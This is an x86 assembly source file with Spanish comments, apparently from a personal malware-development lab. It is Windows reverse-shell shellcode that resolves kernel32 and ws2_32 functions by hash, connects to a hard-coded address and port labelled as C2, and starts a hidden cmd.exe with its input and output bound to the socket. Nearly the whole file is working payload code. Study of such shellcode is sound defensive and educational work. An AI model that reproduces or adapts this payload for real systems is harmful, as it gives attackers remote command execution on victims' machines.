[BITS 32]

_start:
    call geteip

geteip:
    pop edx
    lea edx, [edx - 5]

; -----------------------------------
; VARIABLES LOCALES
; -----------------------------------
BaseKernel32        equ -0x4
; Array para las funciones resultas de kernell32
WaitForSingleObject equ -0x8
TerminateProcess    equ -0xC
LoadLibraryA        equ -0x10
ExitProcess         equ -0x14
CreateProcessA      equ -0x18
CloseHandle         equ -0x1c ; Cabeza del array

BaseWs2_32          equ -0x20
; Array para las funciones resultas de ws2_32
connect             equ -0x24
closesocket         equ -0x28
WSAStartup          equ -0x2c
WSASocketA          equ -0x30
WSACleanup          equ -0x34 ; Cabeza del array


hSocket             equ -0x38   ; size 0x4
wsaData             equ -0x1c8  ; size 0x190
server              equ -0x1d8  ; size 0x10
startupinfo         equ -0x21C  ; size 0x44
processinfo         equ -0x22C  ; size 0x10

; -----------------------------------
; INIT Stack frame
; -----------------------------------
push    ebp         ; guardo ebp del stack frame anterior
mov     ebp, esp    ; inicializo el nuevo
sub     esp, 0x300  ; mejor que sobre

; -----------------------------------
; Obtener base de kernell32.dll
; -----------------------------------
push    edx

mov     eax, [edx + KERNEL32]
push    eax ; (1º arg) module_hash
call    _get_module_handle ; void* get_module_handle(uint32_t module_hash);
mov     [ebp + BaseKernel32], eax
add     esp, 0x4

pop     edx

; -----------------------------------
; Resolver functions from Kernell32
; -----------------------------------
push    edx

lea     eax, [ebp + CloseHandle]
push    eax ; (3º arg) ptr_dest  
lea     eax, [edx + KERNEL32_DEF_HASHES]
push    eax ; (2º arg) ptr_source
mov     eax, dword [ebp + BaseKernel32]
push    eax ; (1º arg) base_module
call    _multi_import ; uint32_t multi_import(uint32_t base_module, ptr* ptr_source, ptr* ptr_dest)
add     esp, 0xC

pop     edx

; -----------------------------------
; Cargar ws2_32.dll
; -----------------------------------
push    edx

lea     ebx, [edx + WS2_32_STR]
push    ebx ; (1º arg) module_name
mov     eax, [ebp + LoadLibraryA]
call    eax ; LoadLibraryA __stdcall (limpia la pila)
mov     [ebp + BaseWs2_32], eax

pop     edx

; -----------------------------------
; Resolver functions from ws2_32.dll
; -----------------------------------
push    edx

lea     eax, [ebp + WSACleanup]
push    eax ; (3º arg) ptr_dest
lea     eax, [edx + WS2_32_DEF_HASHES]
push    eax ; (2º arg) ptr_source
mov     eax, dword [ebp + BaseWs2_32]
push    eax ; (1º arg) base_module
call    _multi_import ; uint32_t multi_import(uint32_t base_module, ptr* ptr_source, ptr* ptr_dest)
add     esp, 0xC

pop     edx

; -----------------------------------
; WSAStartup
; -----------------------------------
push    edx

xor     eax, eax
mov     ax, 0x0202 ; MAKEWORD(2,2)
lea     ecx, [ebp + wsaData]
push    ecx ; (2º arg) ptr to wsaData (variable local)
push    eax ; (1º arg) version
call    [ebp + WSAStartup] ; https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup

pop     edx

; -----------------------------------
; Handle to Socket
; -----------------------------------
push edx

xor     eax, eax
push    eax         ; (6º arg)dwFlag = 0
push    eax         ; (5º arg) g = 0
push    eax         ; (4º arg) lpProtocolInfo = 0
push    eax         ; (3º arg) protocol = 0
inc     eax         ; EAX++
push    eax         ; (2º arg) type = SOCKET_STREAM (1)
inc     eax         ; EAX++
push    eax         ; (1º arg) af = AF_INET (2)
call    [ebp + WSASocketA] ; https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
mov     [ebp + hSocket], eax

pop edx

; -----------------------------------
; Creamos la struct SOCKADDR_IN
; -----------------------------------
; https://learn.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-sockaddr_in
; -----------------------------------
lea     esi, [ebp + server]             ; ESI = ptr to SOCKADDR_IN (Variable local)
xor     eax, eax
mov     word [esi], 0x2                 ; sin_family = AF_INET
mov     word [esi + 0x2], 0x5C11        ; sin_port = 4444 (network byte order [big endian])
mov     dword [esi + 0x4], 0x0100007F   ; sin_addr = 127.0.0.1 (network byte order [big endian])
mov     dword [esi + 0x8], eax          ; sin_zero (primeros 4 bytes)
mov     dword [esi + 0xC], eax          ; sin_zero (ultimos 4 bytes)

; -----------------------------------
; Conectar C2
; -----------------------------------
push    edx

push    0x10                       ; sizeof(socketaddr_in) = 16
push    esi                        ; ptr to socketaddr_in
push    dword [ebp + hSocket]      ; socket handle
call    [ebp + connect] ; https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect

pop edx

; -----------------------------------
; STARTUPINFO
; -----------------------------------
; https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
; -----------------------------------
lea     esi, [ebp + startupinfo]
xor     eax, eax
mov     edi, esi
mov     ecx, 0xB    ; 0x2c (struct size) / 0x4 = 0xB [las veces que hay que repetir la operacion para poner a 0 toda la struct]
; STOre = Escribe el valor de EAX en la dirección apuntada por EDI y avanza el puntero.
; REPeat = Repite la instrucción siguiente hasta que ECX sea 0. Cada repetición decrementa ECX automáticamente.
rep     stosd       ; REPeat STOre String Doubleword.

mov     byte [esi], 0x2c            ; cb = sizeof(STARTUPINFO)
mov     word [esi + 0x2c], 0x101    ; dwFlags = STARTF_USESTDHANDLES (0x100) | STARTF_USESHOWWINDOW (0x1)
mov     word [esi + 0x30], ax       ; wShowWindow = SW_HIDE (0)
mov     edi, [ebp + hSocket]
mov     [esi + 0x38], edi           ; hStdInput = socket
mov     [esi + 0x3c], edi           ; hStdOutput = socket
mov     [esi + 0x40], edi           ; hStdError = socket

; -----------------------------------
; PROCESS_INFORMATION
; -----------------------------------
; https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
; -----------------------------------
lea     edi, [ebp + processinfo]
mov     dword [edi], eax        ; Zero out
mov     dword [edi + 4], eax    ; Zero out
mov     dword [edi + 8], eax    ; Zero out
mov     dword [edi + 12], eax   ; Zero out

; -----------------------------------
; CreateProcess
; -----------------------------------
; (DEBUGG)

push    edx

lea     ecx, [edx + CMD_STRING]
push    edi        ; lpProcessInformation
push    esi        ; lpStartupInfo
xor     eax, eax
push    eax        ; lpCurrentDirectory
push    eax        ; lpEnvironment
push    eax        ; dwCreationFlags
inc     eax
push    eax        ; bInheritHandles
dec     eax
push    eax        ; lpThreadAttributes
push    eax        ; lpProcessAttributes
push    ecx        ; lpCommandLine
push    eax        ; lpApplicationName
call    [ebp + CreateProcessA] ; https://learn.microsoft.com/es-es/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

pop edx

; -----------------------------------
; WaitForSingleObject
; -----------------------------------
mov     eax, 0xFFFFFFFF                 ; INFINITE
push    eax                             ; dwMilliseconds = INFINITE
push    dword [ebp + processinfo + 0x0] ; hHandle = pi.hProcess
call    [ebp + WaitForSingleObject]; https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject

; -----------------------------------
; Cleanup (closesocket, WSACleanup, TerminateProcess)
; -----------------------------------

; -----------------------------------
; END
; -----------------------------------
mov esp, ebp    ; limpia la pila
pop ebp         ; restaura el viejo frame pointer
ret             ; vuelve a la dirección de retorno

; -----------------------------------
%include "C:\Users\test\Desktop\mal-dev-lab\shellcodes\x86\runtime_linking\asm\exports.asm"
; -----------------------------------

KERNEL32:       dd 0x4b1ffe8e
WS2_32_STR:     db 'ws2_32.dll', 0
CMD_STRING:      db 'cmd.exe', 0

KERNEL32_DEF_HASHES:
    dd 0x723EB9D5   ; CloseHandle:          
    dd 0x46718AE6   ; CreateProcessA:       
    dd 0x9590A319   ; ExitProcess:          
    dd 0xC8E88006   ; LoadLibraryA:           
    dd 0x9e6f6842   ; TerminateProcess:       
    dd 0xc547757b   ; WaitForSingleObject:
    dd 0xFFFFFFFF    


WS2_32_DEF_HASHES:
    dd 0xaff835ad   ; WSACleanup:
    dd 0xcebab524   ; WSASocketA:
    dd 0xed9ef56d   ; WSAStartup:
    dd 0x939d7d9c   ; closesocket:
    dd 0xedd8fe8a   ; connect:
    dd 0xFFFFFFFF
